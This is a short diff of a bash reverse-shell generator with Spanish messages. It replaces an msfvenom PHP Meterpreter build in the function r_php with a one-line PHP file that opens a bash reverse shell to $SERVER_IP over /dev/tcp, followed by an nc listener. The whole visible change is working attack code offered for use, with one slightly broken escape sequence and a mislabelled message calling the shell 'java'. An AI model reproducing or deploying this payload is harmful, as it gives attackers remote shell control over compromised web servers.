@@ -34,16 +34,8 @@ function r_webshell {
 
 #php
 function r_php {
-    test -f /usr/bin/msfvenom
-
-    if [ "$(echo $?)" == "0" ];
-    then
-        msfvenom -p php/meterpreter/reverse_tcp LHOST=$SERVER_IP LPORT=$PORT -f raw -o shell.php
-        echo -e "[\033[0;32m+\e[0m] \033[0;36mArchivo con la reverse shell en java creado y listo para ejecutar!\e[0m"
-        nc -lnvp $PORT
-    else
-        echo -e "033[0;31m\n[!] Hay que instalar las dependencias.\e[0m\n" && apt update >/dev/null && apt install metasploit-framework && echo -e "\n[\033[0;32m+\e[0m]\033[0;36m'Dependencias instaladas con éxito!.\e[0m\n"
-    fi
+    echo "<?php exec('/bin/bash -c \"bash -i > /dev/tcp/$SERVER_IP/$PORT 0>&1\"'); ?>" > revers.php
+    nc -lnvp $PORT
 }
 
 #python
